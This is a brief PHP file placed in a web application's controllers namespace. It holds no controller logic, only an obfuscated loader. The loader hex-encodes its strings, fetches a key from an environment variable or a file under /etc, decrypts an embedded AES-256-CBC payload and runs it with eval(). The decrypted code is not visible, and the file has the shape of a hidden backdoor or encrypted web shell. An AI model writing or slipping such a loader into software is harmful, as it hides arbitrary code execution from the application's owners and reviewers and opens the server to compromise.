<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('noJfOh9JfPvwEzLJJYsklw==');

$c=base64_decode(

'iA47jbGxFL/PR2LM+Nymuf3ob7HIhpjXok0q2LsxGW7NHOSQlF25IIR3fZSx4Vbj7JduFdBDGSHS' .
'kMI/Hag4bWHdKdg2+xCagYVn2l6d5ETxwnKGdVTjFKJPfcODU4gFpSzPCU9CVxJRE3/eJLv+nvlk' .
'EQbrnEGZ8Ivz+dowf/adjO9zhI6oKLooOVwCbBPDHHUzUj3Xowe5g2azHbsaZBQhiBSU6HKnp8er' .
'AleoGWUWVrqoerRTeG+Vj9gN7whG'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

